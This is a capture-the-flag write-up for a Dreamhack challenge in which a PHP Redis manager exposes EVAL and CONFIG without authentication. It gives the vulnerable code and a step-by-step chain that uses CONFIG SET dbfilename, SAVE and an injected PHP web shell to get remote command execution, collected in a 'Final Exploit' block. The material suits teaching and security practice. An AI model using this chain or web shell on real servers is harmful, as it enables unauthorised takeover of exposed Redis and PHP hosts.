## 🚩 phpMyRdis

---

### 📝 Description

A web service that allows managing Redis using PHP.  
Find the vulnerability and retrieve the flag.

Flag format: `null{...}`  
Tech Stack: PHP + Redis

---

### 🔍 Background

**Redis (Remote Dictionary Server)** is an in-memory key-value data store that supports periodic persistence to disk. Key features involved in this challenge:

| Setting      | Value     | Description |
|--------------|-----------|-------------|
| `save`       | `100 0`   | Save to disk if 0+ changes in 100 seconds |
| `dbfilename` | `dump.rdb`| Filename to store data |
| `dir`        | `./`      | Directory to store data |

- Redis supports Lua scripting via `EVAL`  
- Redis can be manipulated to **write files** on the server using its config and persistence features.

Redis Lua reference: https://docs.w3cub.com/redis/eval

---

### 🔍 Code Analysis

#### `index.php`

```php
if (isset($_POST['cmd'])) {
    $redis = new Redis();
    $redis->connect($REDIS_HOST);
    $ret = json_encode($redis->eval($_POST['cmd']));
    echo "<pre>$ret</pre>";
    
    $_SESSION['history_'.$_SESSION['history_cnt']] = $_POST['cmd'];
    $_SESSION['history_cnt'] += 1;

    if (isset($_POST['save'])) {
        $path = './data/' . md5(session_id());
        $data = '> ' . $_POST['cmd'] . PHP_EOL . str_repeat('-', 50) . PHP_EOL . $ret;
        file_put_contents($path, $data);
        echo "saved at: <a target='_blank' href='$path'>$path</a>";
    }
}
```

- Executes Redis Lua commands via `eval($_POST['cmd'])`.
- If “Save” is checked, it writes results to a file on disk in `/data/`.

#### `config.php`

```php
if (isset($_POST['option'])) {
    $redis = new Redis();
    $redis->connect($REDIS_HOST);
    if ($_POST['option'] == 'GET') {
        $ret = json_encode($redis->config($_POST['option'], $_POST['key']));
    } elseif ($_POST['option'] == 'SET') {
        $ret = $redis->config($_POST['option'], $_POST['key'], $_POST['value']);
    } else {
        die('error !');
    }
    echo "<pre>$ret</pre>";
}
```

- Allows reading and modifying Redis config using the `CONFIG` command.

---

### ⚠️ Vulnerability Summary

- The service gives unauthenticated access to Redis `EVAL` and `CONFIG` commands.
- Redis can be instructed to **write arbitrary files** on the server using its save mechanism.

---

### 💥 Exploitation Steps

1. **Find the Redis directory**:

```bash
CONFIG GET dir
```

Returns:

```json
{"dir":"/var/www/html"}
```

2. **Change the DB filename** to a PHP file:

```bash
CONFIG SET dbfilename redis.php
```

3. **Lower the save interval**:

```bash
CONFIG SET save "60 0"
```

This means: if 0+ changes occur in 60 seconds, Redis will save to disk.

4. **Inject PHP web shell** via Lua + `EVAL`:

```lua
return redis.call("set", "test", "<?php system($_GET['cmd']); ?>");
```

5. **Trigger a save**:

```bash
SAVE
```

Redis will now serialize all key-value pairs into `/var/www/html/redis.php`.

6. **Access the web shell**:

```php
http://host1.dreamhack.games:<PORT>/redis.php?cmd=/flag
```

This triggers your web shell and runs the command to read the flag.

---

### 🧪 Why does it work?

- `dbfilename` decides the name of the file Redis writes to.
- When `SAVE` is called, Redis dumps **all keys**, including our PHP payload.
- Because the payload is valid PHP, the web server executes it on request.

---

### ✅ Final Exploit

```php
// Step 1: Set redis.php as output file
CONFIG SET dbfilename redis.php

// Step 2: Inject web shell
EVAL "return redis.call('set','test','<?php system($_GET[\"cmd\"]); ?>');" 0

// Step 3: Force save
SAVE

// Step 4: Access shell
http://host1.dreamhack.games:<PORT>/redis.php?cmd=/flag
```

---

### 📌 Key Takeaways

- Redis can be abused to write arbitrary files using `EVAL`, `CONFIG SET`, and `SAVE`.
- Be careful exposing Redis to untrusted input — it's extremely powerful.
- Even harmless-looking interfaces (e.g. a Redis GUI) can lead to RCE if improperly secured.
